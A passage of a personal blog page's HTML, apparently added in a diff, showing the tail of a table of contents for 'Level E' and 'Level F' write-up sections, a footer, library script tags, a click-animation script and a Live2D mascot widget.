E</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-14"><span class="nav-number">16.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-14"><span class="nav-number">16.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-14"><span class="nav-number">16.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-14"><span class="nav-number">16.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-F"><span class="nav-number">17.</span> <span class="nav-text">Level F</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-15"><span class="nav-number">17.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-15"><span class="nav-number">17.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-15"><span class="nav-number">17.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-15"><span class="nav-number">17.4.</span> <span class="nav-text">Img:</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
